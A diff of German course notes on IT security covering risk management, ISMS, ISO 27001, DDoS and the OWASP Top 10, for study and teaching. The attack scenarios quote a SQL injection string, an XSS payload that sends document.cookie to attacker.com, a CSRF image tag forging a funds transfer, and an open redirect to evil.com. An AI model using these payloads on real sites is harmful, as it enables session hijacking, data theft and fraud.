+- Eintretenswahrscheindlichkeit: Wie häufig tritt ein Ereignis in einem bestimmten Zeitraum ein oder wie lange ist der Zeitraum zwischen zwei Ereignissen.
+- Schadensausmass: Was passiert mit einer Ressource, wenn ein Ereignis eintritt?
+- In der Regel nimmt man für beide Werte die schwersten Ausprägungen an.
+    
+##### Risikomanagement
+
+![](links/2020-08-15_11-45-34 copy.png)
+
+- Risiken sollen so verwaltet werden, dass sie möglichst nicht im inakzeptablen Bereich liegen. In der Praxis lässt sich das Schadensausmass oft nicht verringern, weshalb das Risiko meist durch Reduktion der Eintrittswahrscheindlichkeit verringert wird. Dazu werden mitigierende Kontrollen definiert.
+- Regelmässig sind alle Risiken und die mitigierenden Massnahmen neu zu bewerten um sicherzustellen, dass das Risiko noch im akzeptablen Bereich liegt.
+
+##### Umgang mit Risiken
+Mögliche Strategien im Umgang mit Risiken:
+- Eliminieren
+    - Durch geeignete Massnahmen die Eintretenswahrscheindlichkeit auf Null senken.
+- Überwälzen
+    - Das Risiko wird versichert, bzw. auf einen anderen Marktteilnehmer übertragen (z.B. mittels AGB).
+- Reduzieren (Mitigieren)
+    - Das Schadensausmass wird durch geeignete Massnahmen reduziert.
+- Akzeptieren
+    - Das Risiko wird als geschäftsnotwendig akzeptiert, laufend überwacht und regelmässig neu bewertet.
+
+#### ISMS - Information security management system
+    
+- [ISMS](https://en.wikipedia.org/wiki/Information_security_management)
+    
 - Hier muss im Management die Wahrnehmung von den Geführungen eingebracht werden um Mittel gesprochen zu bekommen.
 
 - IT-Governance ist die Verantwortung von Führungskräften und Aufsichtsräten und besteht aus Führung, Organisationsstrukturen und Prozessen, die sicherstellen, dass die Unternehmens-IT dazu beiträgt, die Organisationsstrategie und –ziele zu erreichen und zu erweitern.
 
-- Definition
+##### Definition
 
-    - Verfahren und Regeln innerhalb einer Unternehmung um die Informationssicherheit nachhaltig zu
-        - definieren
-        - zu steuern 
-        - zu kontrollieren und aufrecht zu erhalten
-    
-    - Grundziele einer unternehmens- bez. Behördenweiten Informationssicherheit:
-        - Dauerhafte Erfüllung der Anforderungen 
-        - Nachhaltige Begrenzung der Risiken
+- Verfahren und Regeln innerhalb einer Unternehmung um die Informationssicherheit nachhaltig zu
+    - definieren
+    - zu steuern 
+    - zu kontrollieren und aufrecht zu erhalten
 
-Vorteile eines ISMS
+- Grundziele einer unternehmens- bez. Behördenweiten Informationssicherheit:
+    - Dauerhafte Erfüllung der Anforderungen 
+    - Nachhaltige Begrenzung der Risiken
+
+##### Vorteile eines ISMS
 
 - Basis für eine systematische, wirtschaftliche und nachhaltige Informationssicherheit im Unternehmen.
 - Ermöglicht die kontinuierliche Verbesserung.
@@ -292,30 +476,28 @@ Vorteile eines ISMS
 - Steigert Rentabilität (Ausfallreduzierung, Wiederanlauf nach Sicherheitsvorfällen).
 - Unterstützt die Wettbewerbsfähigkeit des Unternehmens (gezielte Investitionen in Sicherheit).
 
-Minimale Anforderungen
+##### Minimale Anforderungen
 
 - Eine Security Policy, welche vom Management aktiv unterstützt wird. n Eine nachvollziehbare Auswahl von Controls.
 - Key Performance Indikatoren zur Messung von Erfüllung und Fortschritten bezüglich Zielen.
 - Ein dokumentiertes Risikomanagement, bei welchem Risiken erfasst, dokumentiert, gemildert und die Restrisiken akzeptiert werden.
 - Regelmässige Überprüfung der Compliance.
 
-Kritische Erfolgsfaktoren
+##### Kritische Erfolgsfaktoren
 
 - Offenkundige Unterstützung und Engagement seitens der Geschäftsführung. n Sicherheitspolitik, -ziele und -aktivitäten als Ausdruck der Geschäftsziele.
-- Implementierung von Sicherheit in Übereinstimmung mit der
-
-Organisationskultur.
+- Implementierung von Sicherheit in Übereinstimmung mit der Organisationskultur.
 
 - Eingehende Kenntnis der Sicherheitsanforderungen, der Risikoanalyse und des Risikomanagements.
 - Verteilung von Richtlinien über Informationssicherheitspolitik und Normen an alle Angestellte und Auftragnehmer.
 - Schulung und effektives Marketing von Sicherheit gegenüber allen Managern und Mitarbeitern.
 - Messsystem zur Leistungsbeurteilung der ISMS und zum Feedback von Verbesserungsvorschlägen.
   
-Sicherheitspyramide
+#### Sicherheitspyramide
 
 ![](links/2021-01-07_22-51-15.png)
 
-Akteure und Verantwortlichkeiten
+##### Akteure und Verantwortlichkeiten
 
 |Geschäftsleitung |Gesamtverantwortung |
 |---|---|
@@ -324,9 +506,9 @@ Akteure und Verantwortlichkeiten
 | Security Management (CISO) | Verantwortlich für IT Security Tagesgeschäft Erlässt Security Procedures im Rahmen der Standards Kontrolliert Einhaltung der Richtlinien
 | Spezialisten | Betreiben IT im Rahmen der Vorgaben durch Policy, Stanrdards und Procedures
 
-Chief Information Security Officer
+##### Chief Information Security Officer
 
-- Aufgaben des Chief Information Security Officers (CISO):
+Aufgaben des Chief Information Security Officers (CISO):
     - Erarbeitung und Definition der sicherheitsrelevanten Objekte, der Bedrohungen und Risiken und den daraus abgeleiteten Sicherheitszielen.
     - Aufbau und Betrieb einer Organisationseinheit zur Umsetzung der Sicherheitsziele. n Definition und Implementierung der nötigen Prozesse für die Informationssicherheit. n Ausarbeitung der Sicherheitskonzepte und Sicherheitsvorschriften.
     - Audit der Funktionseinheiten zum Stand der Umsetzung und Weiterenwicklung der Sicherheitsvorschriften.
@@ -334,43 +516,43 @@ Chief Information Security Officer
     - Ressourcen und Budget für den Aufbau und den Betrieb des ISMS bestimmen.
     - Zertifizierung: CISM (www.isaca.org).
 
-Linienorganisation
+##### Linienorganisation
 
 ![](links/2021-01-07_22-58-29.png)
 
-Projektorganisation
+##### Projektorganisation
 
 ![](links/2021-01-07_22-59-17.png)
 
-Demi Cycle
+#### Demi Cycle
 
 Plan -> Do -> Check -> Act -> Plan
 
-Plan
+##### Plan
 
 - Die nötigen Dokumente wie Sicherheitspolitik (Security Policy), Ziele, Vorgaben, Prozesse und Controls werden definiert.
 - Im Zentrum steht das Management der Risiken sowie die kontinuierliche Verbesserung der Sicherheit.
 - Das ISMS muss sich an den Vorgaben und (Geschäfts-)Zielen der Firma ausrichten.
 
-Do
+##### Do
 
 - Die Sicherheitspolitik muss zum Leben erweckt werden. n Controls müssen eingeführt werden.
 - Controls müssen betrieben werden.
 - Die Prozesse und Tätigkeiten werden gelebt.
 
-Check
+##### Check
 
 - Die Leistungsfähigkeit der Prozesse wird gegen die Sicherheitspolitik und die Ziele der Firma geprüft und bewertet.
 - Dazu gibt es Prozessmessungen (KPI) sowie Prüfungen und Audits.
 - Die Ergebnisse werden dem Management zum Review vorgelegt.
 
-Act
+##### Act
 
 - Die Firma beschliesst korrigierende und präventive Massnahmen, welche auf den Resultaten der Check Phase beruhen.
 - Das Ziel ist es, das ISMS und die damit verbundenen Prozesse kontinuierlich zu verbessern und dadurch die Sicherheit zu erhöhen
 
 
-Verschiedene Regulatorien
+#### Verschiedene Regulatorien
 
 - Gesetze und Normen wie Basel II / III 
 - Rundbrief der Bankenkommission
@@ -381,15 +563,15 @@ Verschiedene Regulatorien
 - Governance, Risk and Compliance (GRC)
 
 
-ISMS: Standards
+#### ISMS: Standards
 
-Standards
+##### Standards
 
 - Die gängigsten Methoden, Best-Practices und Standards unterscheiden sich nicht gross bezüglich der Ausgestaltung des Sicherheitsprozesses und der Verantwortlichkeiten des Managements, jedoch in der Auswahl der Massnahmen und der Risikobewertung.
 - BSI (Bundesamt für Sicherheit in der Informationstechnik) n COBIT
 - ISO 27001
 
-ISO 27001
+##### ISO 27001
 
 - ISO/IEC 27001 beschreibt wie die physische, die technische, die organisatorische und die personelle Sicherheit umgesetzt werden kann.
 - ISO/IEC 27001 ist ein Management Prozess und KEINE technische Anleitung.
@@ -397,27 +579,27 @@ ISO 27001
 - Der zentrale Punkt ist die kontinuierliche Selbst-Verbesserung einer Unternehmung (Deming Cycle), welche akzeptiert, dass eine umfassende Sicherheit nicht durch ein einmaliges Projekt geschaffen und schon gar nicht erhalten werden kann.
 - Das bedeutet, dass mit der Einführung von ISO/IEC 27001 die Sicherheit KEINEN Sprung nach vorne machen wird, dass aber der Grundstein für eine Entwicklung in die richtige Richtung gelegt wird.
 
-#### Nachbearbeitung
+### Nachbearbeitung
 
 - **Aufgabe:**
     - Erarbeiten eines Konzepts und Präsentation zum Thema DDOS. Diskutieren Sie mögliche Probleme im Moodle Modulforum (1 Thread pro Gruppe).
 
-##### Distributed Denial of Service (DDoS)
+#### Distributed Denial of Service (DDoS)
 
 Bei der Distributed Denial of Service (DDos) Attake, handelt es sich um einen gezielten Angriff auf eine Webseite oder einen zur Verfügung gestellten Dienst über eine vielzahl von Geräten (Devices). Das Ziel ist es, die Verfügbarkeit der Webseite oder des Dienstes zu stören. Ein solcher Angriff kann wirtschaftliche Folgen haben. Dabei werden die Geräte oft "ferngesteuert" und als sogenannte Bots bezeichnet. Das Netz dieser Geräte wird als Botnetz bezeichnet. Botnetze können im Dark Web bereits für kleinere Beträge gemietet werden. Die Geräte werden meist über einen Trojaner oder ein Wurm "infiziert" welcher eine Verbindung zu einem zentralen Server herstellt. Neuere Bots verbinden sich über Peer-to-Peer mit anderen Bots. Über die Bots kann weitere Malware (z.B. Keylogger, etc.) verbreitet werden.
 
 Ein DDos-Angrriff hat zum ziel, eine Webseite mit Anfragen (Requests) zu "bombardieren", so dass die Webseite nicht mehr aufgeruffen werden kann bzw. unter der Last der Anfragen zusammenbricht.
 
-###### Angriff
+##### Angriff
 
-####### Detektion
+###### Detektion
 
 Symptome einer DDoS Attacke sind
 
 * Hoher Ressourcen verbrauch
 * Lange Antwortzeiten
 
-####### Verhinderung
+###### Verhinderung
 
 Folgende Massnahmen können DDoS-Angriffe nicht komplett verhindern aber erschweren.
 
@@ -430,7 +612,7 @@ Folgende Massnahmen können DDoS-Angriffe nicht komplett verhindern aber erschwe
 * Systeme "härten" (*Hardening*)
 * Aktuelle Patchlevel für OS und Software
 
-######## Reaktion
+####### Reaktion
 
 Reaktion (oder Gegenmassnahmen) können sein:
 
@@ -442,7 +624,7 @@ Reaktion (oder Gegenmassnahmen) können sein:
 ---
 ## 2 Anwendungssicherheit
 
-#### Lernziele
+### Lernziele
 
 - Ich kenne typische Bedrohungen und Massnahmen im Bereich sicherer Programmierung.
 - Ich kann Praxisbeispiele von typischen Attacken nennen und die richtigen Massnahmen treffen.
@@ -451,43 +633,43 @@ Reaktion (oder Gegenmassnahmen) können sein:
 - Ich kenne A1, A3, A4 und A8 aus den OWASP Top 10 (2013) und kann die Angriffe sowie Gegenmassnahmen erklären.
 - Ich kenne die Neuerungen von OWASP Top 10 (2013) zur Vorgängerversion 2010.
 
-#### Vorbereitung
+### Vorbereitung
 
-##### OWASP
+#### OWASP
 >Um der steigenden Bedeutung der Sicherheit von Web-Anwendungen für die Sicherheit von Unternehmen Rechnung zu tragen, wurde das OWASP-Projekt (Open Web Application Security Project) initiiert. OWASP ist eine Vereinigung von Firmen und Organisationen, wie Sun Microsystems, IBM, Swiss Federal Institute of Technology oder auch British Telecom, die das Ziel haben, die Sicherheit von Web-Anwendungen zu verbessern. Mit den OWASP Top-Ten stellt das Konsortium ein Dokument zur Verfügung, das einen Überblick über die wichtigsten Schwachstellen und Angriffe auf Web-Anwendungen umfasst und ca. alle drei Jahre aktualisiert wird. Das Dokument wird durch Sicherheitsexperten aus aller Welt erstellt. Seit 2008 gelten die Top-Ten sogar als offizielle Vorgaben für den Payment Card Industry (PCI) Data Security Standard, so dass bei Code Reviews nachgewiesen werden muss, dass geeignete Maßnahmen zur Abwehr der in den Top-Ten gelisteten Schwachstellen und Verwundbarkeiten getroffen wurden. Im November 2017 lag ein noch nicht verabschiedeter Request for Comments vor (siehe https://github.com/OWASP/Top10/). Nachfolgend gehen wir auf ausgewählte Schwachstellen, die über die Zeit nicht an Aktualität verloren haben, etwas näher ein.
 
 
-###### OWASP Top10
+#### OWASP Top10
 
-- A1 – Injection
-    >Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
+##### A1 – Injection
+>Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
     
-- A2 – Broken Authentication and Session Management
-    >Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.
+##### A2 – Broken Authentication and Session Management
+>Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.
 
-- A3 – Cross-Site Scripting (XSS)
-    >XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.
+##### A3 – Cross-Site Scripting (XSS)
+>XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.
 
-- A4 – Insecure Direct Object References
-    >A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.
+##### A4 – Insecure Direct Object References
+>A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.
 
-- A5 – Security Misconfiguration
-    >Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.
+##### A5 – Security Misconfiguration
+>Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.
 
-- A6 – Sensitive Data Exposure
-    >Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser.
+##### A6 – Sensitive Data Exposure
+>Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser.
 
-- A7 – Missing Function Level Access Control
-    >Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.
+##### A7 – Missing Function Level Access Control
+>Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.
 
-- A8 - Cross-Site Request Forgery (CSRF)
-    >A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.
+##### A8 - Cross-Site Request Forgery (CSRF)
+>A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.
 
-- A9 - Using Components with Known Vulnerabilities
-    >Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.
+##### A9 - Using Components with Known Vulnerabilities
+>Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.
 
-- A10 – Unvalidated Redirects and Forwards
-    >Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.
+##### A10 – Unvalidated Redirects and Forwards
+>Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.
 
 
 Diese zwei Fragen sollte man sich dazu stellen:
@@ -497,127 +679,129 @@ Diese zwei Fragen sollte man sich dazu stellen:
 **How Do I Prevent XYZ?**
 
 
-###### Example Attack Scenarios
+#### Example Attack Scenarios
 
-- A1 – Injection
+##### A1 – Injection
 
-    - Scenario #1: The application uses untrusted data in the construction of the following vulnerable SQL call:
-        - String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
-    
-    - Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)):
-        - Query HQLQuery = session.createQuery(“FROM accounts WHERE custID='“ + request.getParameter("id") + "'");
-    
-    - In both cases, the attacker modifies the ‘id’ parameter value in her browser to send: ' or '1'='1. For example: http://example.com/app/accountView?id=' or '1'='1 This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify data or even invoke stored procedures.
+- Scenario #1: The application uses untrusted data in the construction of the following vulnerable SQL call:
+    - String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
 
+- Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)):
+    - Query HQLQuery = session.createQuery(“FROM accounts WHERE custID='“ + request.getParameter("id") + "'");
 
-- A2 – Broken Authentication and Session Management "Hijacking"
-
-    - Scenario #1: Airline reservations application supports URL rewriting, putting session IDs in the URL:
-        - http://example.com/sale/saleitems;jsessionid= 2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii
-
-    - An authenticated user of the site wants to let his friends know about the sale. He e-mails the above link without knowing he is also giving away his session ID. When his friends use the link they will use his session and credit card.
-
-    - Scenario #2: Application’s timeouts aren’t set properly. User uses a public computer to access site. Instead of selecting “logout” the user simply closes the browser tab and walks away. Attacker uses the same browser an hour later, and that browser is still authenticated.
-
-    - Scenario #3: Insider or external attacker gains access to the system’s password database. User passwords are not properly hashed, exposing every users’ password to the attacker.
+- In both cases, the attacker modifies the ‘id’ parameter value in her browser to send: ' or '1'='1. For example: http://example.com/app/accountView?id=' or '1'='1 This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify data or even invoke stored procedures.
 
 
-- A3 – Cross-Site Scripting (XSS)
+##### A2 – Broken Authentication and Session Management "Hijacking"
 
-    - The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
-    
-        - (String) page += "<input name='creditcard' type='TEXT‘ value='" + request.getParameter("CC") + "'>";
-    
-    - The attacker modifies the ‘CC’ parameter in his browser to:
-    
-        - '>\<script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'.
-    
-    - This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
-    
-    - Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See A8 for info on CSRF.
+- Scenario #1: Airline reservations application supports URL rewriting, putting session IDs in the URL:
+    - http://example.com/sale/saleitems;jsessionid= 2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii
 
-- A4 – Insecure Direct Object References
+- An authenticated user of the site wants to let his friends know about the sale. He e-mails the above link without knowing he is also giving away his session ID. When his friends use the link they will use his session and credit card.
 
-    - The application uses unverified data in a SQL call that is accessing account information:
+- Scenario #2: Application’s timeouts aren’t set properly. User uses a public computer to access site. Instead of selecting “logout” the user simply closes the browser tab and walks away. Attacker uses the same browser an hour later, and that browser is still authenticated.
 
-        - String query = "SELECT * FROM accts WHERE account = ?"; 
-        
-        - PreparedStatement pstmt = connection.prepareStatement(query , … );
-    
-        - pstmt.setString( 1, request.getParameter("acct"));
-        
-        - ResultSet results = pstmt.executeQuery( );
-    
-    - The attacker simply modifies the ‘acct’ parameter in her browser to send whatever account number she wants. If not properly verified, the attacker can access any user’s account, instead of only the intended customer’s account.
-        
-        - http://example.com/app/accountInfo?acct=notmyacct
-
-- A5 – Security Misconfiguration
-
-    - Scenario #1: The app server admin console is automatically installed and not removed. Default accounts aren’t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.
-    
-    - Scenario #2: Directory listing is not disabled on your server. Attacker discovers she can simply list directories to find any file. Attacker finds and downloads all your compiled Java classes, which she decompiles and reverse engineers to get all your custom code. She then finds a serious access control flaw in your application.
-    
-    - Scenario #3: App server configuration allows stack traces to be returned to users, potentially exposing underlying flaws. Attackers love the extra information error messages provide.
-    
-    - Scenario #4: App server comes with sample applications that are not removed from your production server. Said sample applications have well known security flaws attackers can use to compromise your server.
-
-- A6 – Sensitive Data Exposure
-
-    - Scenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this means it also decrypts this data automatically when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. The system should have encrypted the credit card numbers using a public key, and only allowed back-end applications to decrypt them with the private key.
-    
-    - Scenario #2: A site simply doesn’t use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user’s session cookie. Attacker then replays this cookie and hijacks the user’s session, accessing the user’s private data.
-    
-    - Scenario #3: The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.
-
-- A7 – Missing Function Level Access Control
-
-    - Scenario #1: The attacker simply force browses to target URLs. The following URLs require authentication. Admin rights are also required for access to the “admin_getappInfo” page.
-    
-        - http://example.com/app/getappInfo
-    
-        - http://example.com/app/admin_getappInfo
-    
-    - If an unauthenticated user can access either page, that’s a flaw. If an authenticated, non-admin, user is allowed to access the “admin_getappInfo” page, this is also a flaw, and may lead the attacker to more improperly protected admin pages.
-
-    - Scenario #2: A page provides an ‘action ‘parameter to specify the function being invoked, and different actions require different roles. If these roles aren’t enforced, that’s a flaw.
-
-- A8 - Cross-Site Request Forgery (CSRF)
-
-    - The application allows a user to submit a state changing request that does not include anything secret. For example:
-    
-        - http://example.com/app/transferFunds?amount=1500 &destinationAccount=4673243243
-    
-    - So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:
-    
-        - <img src="http://example.com/app/transferFunds? amount=1500&destinationAccount=attackersAcct#“ width="0" height="0" />
-    
-    - If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.
-
-- A9 - Using Components with Known Vulnerabilities
-
-    - Component vulnerabilities can cause almost any type of risk imaginable, ranging from the trivial to sophisticated malware designed to target a specific organization. Components almost always run with the full privilege of the application, so flaws in any component can be serious, The following two vulnerable components were downloaded 22m times in 2011.
-    
-        - Apache CXF Authentication Bypass
-            – By failing to provide an identity token, attackers could invoke any web service with full permission. (Apache CXF is a services framework, not to be confused with the Apache Application Server.)
-    
-        - Spring Remote Code Execution
-            – Abuse of the Expression Language implementation in Spring allowed attackers to execute arbitrary code, effectively taking over the server.
-    
-    - Every application using either of these vulnerable libraries is vulnerable to attack as both of these components are directly accessible by application users. Other vulnerable libraries, used deeper in an application, may be harder to exploit.
-
-- A10 – Unvalidated Redirects and Forwards
-
-    - Scenario #1: The application has a page called “redirect.jsp” which takes a single parameter named “url”. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware.
-    
-        - http://www.example.com/redirect.jsp?url=evil.com
-    
-    - Scenario #2: The application uses forwards to route requests between different parts of the site. To facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker crafts a URL that will pass the application’s access control check and then forwards the attacker to administrative functionality for which the attacker isn’t authorized.
-    
-        - http://www.example.com/boring.jsp?fwd=admin.jsp
+- Scenario #3: Insider or external attacker gains access to the system’s password database. User passwords are not properly hashed, exposing every users’ password to the attacker.
 
 
-###### Aufgabe: Übung Analyse Webanwendung (ca. 2h)
+##### A3 – Cross-Site Scripting (XSS)
+
+- The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
+
+    - (String) page += "<input name='creditcard' type='TEXT‘ value='" + request.getParameter("CC") + "'>";
+
+- The attacker modifies the ‘CC’ parameter in his browser to:
+
+    - '>\<script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'.
+
+- This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+
+- Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See A8 for info on CSRF.
+
+##### A4 – Insecure Direct Object References
+
+- The application uses unverified data in a SQL call that is accessing account information:
+
+    - String query = "SELECT * FROM accts WHERE account = ?"; 
+
+    - PreparedStatement pstmt = connection.prepareStatement(query , … );
+
+    - pstmt.setString( 1, request.getParameter("acct"));
+
+    - ResultSet results = pstmt.executeQuery( );
+
+- The attacker simply modifies the ‘acct’ parameter in her browser to send whatever account number she wants. If not properly verified, the attacker can access any user’s account, instead of only the intended customer’s account.
+
+    - http://example.com/app/accountInfo?acct=notmyacct
+
+##### A5 – Security Misconfiguration
+
+- Scenario #1: The app server admin console is automatically installed and not removed. Default accounts aren’t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.
+
+- Scenario #2: Directory listing is not disabled on your server. Attacker discovers she can simply list directories to find any file. Attacker finds and downloads all your compiled Java classes, which she decompiles and reverse engineers to get all your custom code. She then finds a serious access control flaw in your application.
+
+- Scenario #3: App server configuration allows stack traces to be returned to users, potentially exposing underlying flaws. Attackers love the extra information error messages provide.
+
+- Scenario #4: App server comes with sample applications that are not removed from your production server. Said sample applications have well known security flaws attackers can use to compromise your server.
+
+##### A6 – Sensitive Data Exposure
+
+- Scenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this means it also decrypts this data automatically when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. The system should have encrypted the credit card numbers using a public key, and only allowed back-end applications to decrypt them with the private key.
+
+- Scenario #2: A site simply doesn’t use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user’s session cookie. Attacker then replays this cookie and hijacks the user’s session, accessing the user’s private data.
+
+- Scenario #3: The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.
+
+##### A7 – Missing Function Level Access Control
+
+- Scenario #1: The attacker simply force browses to target URLs. The following URLs require authentication. Admin rights are also required for access to the “admin_getappInfo” page.
+
+    - http://example.com/app/getappInfo
+
+    - http://example.com/app/admin_getappInfo
+
+- If an unauthenticated user can access either page, that’s a flaw. If an authenticated, non-admin, user is allowed to access the “admin_getappInfo” page, this is also a flaw, and may lead the attacker to more improperly protected admin pages.
+
+- Scenario #2: A page provides an ‘action ‘parameter to specify the function being invoked, and different actions require different roles. If these roles aren’t enforced, that’s a flaw.
+
+##### A8 - Cross-Site Request Forgery (CSRF)
+
+- The application allows a user to submit a state changing request that does not include anything secret. For example:
+
+    - http://example.com/app/transferFunds?amount=1500 &destinationAccount=4673243243
+
+- So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:
+
+```{html}
+<img src="http://example.com/app/transferFunds? amount=1500&destinationAccount=attackersAcct#“ width="0" height="0" />
+```
+
+- If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.
+
+##### A9 - Using Components with Known Vulnerabilities
+
+- Component vulnerabilities can cause almost any type of risk imaginable, ranging from the trivial to sophisticated malware designed to target a specific organization. Components almost always run with the full privilege of the application, so flaws in any component can be serious, The following two vulnerable components were downloaded 22m times in 2011.
+
+    - Apache CXF Authentication Bypass
+        – By failing to provide an identity token, attackers could invoke any web service with full permission. (Apache CXF is a services framework, not to be confused with the Apache Application Server.)
+
+    - Spring Remote Code Execution
+        – Abuse of the Expression Language implementation in Spring allowed attackers to execute arbitrary code, effectively taking over the server.
+
+- Every application using either of these vulnerable libraries is vulnerable to attack as both of these components are directly accessible by application users. Other vulnerable libraries, used deeper in an application, may be harder to exploit.
+
+##### A10 – Unvalidated Redirects and Forwards
+
+- Scenario #1: The application has a page called “redirect.jsp” which takes a single parameter named “url”. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware.
+
+    - http://www.example.com/redirect.jsp?url=evil.com
+
+- Scenario #2: The application uses forwards to route requests between different parts of the site. To facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker crafts a URL that will pass the application’s access control check and then forwards the attacker to administrative functionality for which the attacker isn’t authorized.
+
+    - http://www.example.com/boring.jsp?fwd=admin.jsp
+
+
+#### Aufgabe: Übung Analyse Webanwendung (ca. 2h)
 
 - Sie sind Sicherheitsverantwortlicher bei einem IT-Dienstleister, der für Krankenkassen ein Webportal entwickelt, mit dem diese Patientendossiers verwalten können. Kunden können sich einloggen und Rechnungen für die Rückerstattung einreichen.
 
@@ -629,9 +813,9 @@ Diese Aufgabe wird nicht bewertet. Sie ist bis zum Vortag der PVA abzuschliessen
 Es erfolgt ein Feedback während der PVA.
 
 
-##### Kapitel 3 und 4 IT-Sicherheit
+#### Kapitel 3 und 4 IT-Sicherheit
 
-###### ISO/OSI-Modell
+##### ISO/OSI-Modell
 
 - **Bitübertragung**
